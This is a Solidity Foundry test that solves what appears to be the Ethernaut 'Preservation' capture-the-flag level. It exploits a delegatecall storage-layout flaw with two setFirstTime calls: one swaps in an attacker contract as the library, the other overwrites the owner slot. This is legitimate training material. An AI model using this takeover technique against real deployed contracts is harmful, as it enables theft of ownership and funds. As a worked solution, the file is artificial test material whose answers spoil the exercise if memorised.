pragma solidity ^0.8.0;

import 'forge-std/Test.sol';
import 'levels/PreservationFactory.sol';
import 'levels/Preservation.sol';
import 'src/PreservationHack.sol';
import 'utils/TestUtils.sol';

contract PreservationTest is Test {
  address player;
  Utils utils;
  PreservationFactory preservationFactory;
  address payable preservationAddress;
  Preservation preservation;
  PreservationHack preservationHack;

  function setUp() public {
    utils = new Utils();
    player = utils.createUsers(1)[0];
    preservationFactory = new PreservationFactory();
    preservationAddress = payable(preservationFactory.createInstance(player));
    preservation = Preservation(preservationAddress);
    preservationHack = new PreservationHack();
  }

  function testHack() public {
    // 1. set slot that stores timeZone1Library address to attacker contract
    preservation.setFirstTime(uint256(uint160(address(preservationHack))));

    // 2. trigger the malicious `setTime` of attacker contract to set `owner` slot
    preservation.setFirstTime(uint256(uint160(player)));

    assertTrue(
      preservationFactory.validateInstance(preservationAddress, player), 'Level not solved'
    );
  }
}
